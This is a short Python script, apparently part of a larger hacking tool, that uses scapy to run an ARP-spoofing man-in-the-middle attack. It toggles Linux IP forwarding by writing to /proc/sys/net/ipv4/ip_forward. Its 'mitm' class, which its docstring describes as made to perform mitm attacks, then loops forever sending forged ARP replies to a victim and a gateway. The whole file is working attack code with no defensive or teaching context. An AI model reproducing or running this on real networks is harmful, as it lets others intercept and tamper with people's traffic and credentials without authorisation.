from scapy.all import ARP, send
import ui, platform
from time import sleep

def IPForward_switch():
    ui.clear()
    if platform.system() == "Linux":
        if "0" in open("/proc/sys/net/ipv4/ip_forward", 'r').read():
            ui.uprint("Enabling ip forwarding for linux")
            f = open("/proc/sys/net/ipv4/ip_forward", "r+")
            f.truncate(0)
            f.write("1")
            f.close()
        else:
            ui.uprint("Disabling ip forwarding",char="-")
            f = open("/proc/sys/net/ipv4/ip_forward", "r+")
            f.truncate(0)
            f.write("0")
            f.close()
    if platform.system() == "Windows":
        ui.uprint("Windows solutions comming soon",char="!")

class mitm:
    """
    This class is made to perform mitm attacks using scapy
    """

    def __init__(self):
        self.victim_ip = self.victim_mac = self.gateway_ip = self.gateway_mac = None
        self.dump = []

    def start(self):
        ui.uprint("Starting MITM attack")
        IPForward_switch()
        while True:
            send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip, hwdst=self.victim_mac))
            send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip, hwdst=self.gateway_mac))


if __name__ == "__main__":
    IPForward_switch()